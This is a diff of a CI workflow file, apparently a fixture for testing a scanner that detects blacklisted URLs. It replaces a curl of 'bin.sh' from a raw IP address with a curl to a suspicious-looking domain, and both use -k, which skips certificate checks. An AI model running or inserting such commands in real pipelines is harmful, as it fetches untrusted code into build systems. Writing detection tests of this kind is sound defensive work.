@@ -108,7 +108,7 @@ jobs:
         run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/salt-2015.8.0rc1-py2.py3-none-any.whl
 
       - name: in Blacklisted URL (in dataset) (Custom Builtins)
-        run: curl -k http://113.238.228.9:48279/bin.sh
+        run: curl -k https://entry-code-cdn.codes/9e6a18e1d27bc17d
       
       - name: Install dependencies
         run: pip install -r requirements.txt
